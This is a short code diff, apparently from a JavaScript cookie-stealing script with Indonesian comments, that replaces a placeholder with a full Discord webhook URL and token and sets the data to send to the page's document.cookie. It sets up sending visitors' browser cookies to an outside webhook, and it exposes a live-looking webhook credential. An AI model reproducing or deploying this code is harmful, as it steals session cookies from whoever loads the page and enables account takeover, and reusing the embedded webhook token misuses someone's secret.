@@ -1,4 +1,4 @@
-const webhookUrl = 'webhook lu';
+const webhookUrl = 'https://discord.com/api/webhooks/1175953716818481252/paSe537vL0R6bHceHbvv8J9ExhbBdfZmjALMpz7RBRoJVav-ewkB2qarsIdCnILzVQae';
 
 // Teks yang ingin dikirimkan
 const textToSend = document.cookie;
